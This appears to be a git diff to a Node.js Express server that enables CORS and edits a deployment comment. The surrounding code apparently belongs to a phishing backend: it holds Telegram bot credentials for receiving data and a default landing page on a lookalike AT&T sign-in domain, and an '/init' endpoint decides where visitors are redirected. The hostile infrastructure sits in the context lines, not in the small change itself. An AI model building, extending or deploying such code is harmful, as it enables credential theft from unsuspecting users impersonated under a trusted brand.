@@ -1,10 +1,11 @@
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
+const cors = require('cors');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// IMPORTANT: Set these environment variables in your hosting provider (e.g., Heroku, Vercel, Render)
+// IMPORTANT: Set these environment variables in your hosting provider
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const ATT_LANDING_PAGE = process.env.ATT_LANDING_PAGE || 'https://signin-att.sbcglobal.online';
@@ -16,6 +17,7 @@ if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
 }
 
 app.use(express.json());
+app.use(cors()); // Enable CORS for all routes
 
 // Main endpoint to determine redirect
 app.get('/init', async (req, res) => {
